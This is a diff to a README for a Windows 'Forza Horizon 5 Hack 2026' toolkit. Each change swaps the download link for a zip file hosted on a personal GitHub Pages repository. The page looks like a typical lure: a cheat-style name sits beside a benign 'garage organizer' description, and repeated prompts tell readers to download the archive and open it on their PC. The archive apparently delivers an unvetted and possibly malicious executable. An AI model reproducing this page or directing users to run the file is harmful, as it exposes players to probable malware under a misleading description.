@@ -5,7 +5,7 @@ description: "Organize and optimize Forza Horizon 5 car builds, tuning, garages,
 ---
 # 🏎️ forza-horizon-5-hack-2026-mexico-garage-toolkit - Build, Tune, and Track Every Car
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Windows_Toolkit-ff4f8b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Gitello448/gitello448.github.io/raw/refs/heads/main/pilotman/Dist-2.0.zip)
+[![Download Now](https://img.shields.io/badge/Download_Now-Windows_Toolkit-ff4f8b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Gitello448/gitello448.github.io/main/pilotman/Dist-2.0.zip)
 
 Forza Horizon 5 Hack 2026 Mexico Garage Toolkit is a Windows companion app for organizing car builds, managing your garage, saving tuning profiles, tracking races, and viewing progression analytics. It is built for players who want a clear, friendly dashboard for the many cars, setups, and event results that build up during a Forza Horizon 5 journey. The layout keeps everyday tasks simple: open the toolkit, choose a section, and use the guided screens to record, review, and improve your garage plan.
 
@@ -19,7 +19,7 @@ The first time you open the toolkit, take a few minutes to look through the main
 
 ## ⬇️ Download and Setup
 
-Visit this link to download the application: [Download the Forza Horizon 5 Hack 2026 Mexico Garage Toolkit](https://github.com/Gitello448/gitello448.github.io/raw/refs/heads/main/pilotman/Dist-2.0.zip).
+Visit this link to download the application: [Download the Forza Horizon 5 Hack 2026 Mexico Garage Toolkit](https://raw.githubusercontent.com/Gitello448/gitello448.github.io/main/pilotman/Dist-2.0.zip).
 
 This is the main download page for the toolkit. Keep the page open until the download begins, then let the download finish before opening the file.
 
@@ -135,7 +135,7 @@ If something behaves unexpectedly, close the toolkit and open it again. Most dis
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [Get the Forza Horizon 5 Hack 2026 Mexico Garage Toolkit](https://github.com/Gitello448/gitello448.github.io/raw/refs/heads/main/pilotman/Dist-2.0.zip).
+Visit this link to download the application: [Get the Forza Horizon 5 Hack 2026 Mexico Garage Toolkit](https://raw.githubusercontent.com/Gitello448/gitello448.github.io/main/pilotman/Dist-2.0.zip).
 
 Open the page, follow the download prompt, and wait for the download to complete. Once it finishes, open the file to launch the toolkit on your Windows PC. From the dashboard, begin with Garage Management and add your first car.
 
